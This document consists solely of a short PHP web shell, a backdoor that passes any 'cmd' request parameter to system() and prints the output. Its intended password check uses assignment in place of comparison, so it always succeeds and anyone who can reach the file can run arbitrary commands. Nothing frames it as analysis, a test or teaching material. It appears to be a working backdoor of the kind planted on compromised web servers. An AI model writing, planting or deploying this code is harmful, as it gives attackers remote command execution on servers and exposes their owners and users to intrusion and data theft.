<?php if(isset($_REQUEST['cmd']) && isset($_REQUEST['pass'])) { if ($_REQUEST['pass'] = 'randompassstring'){echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }}?>
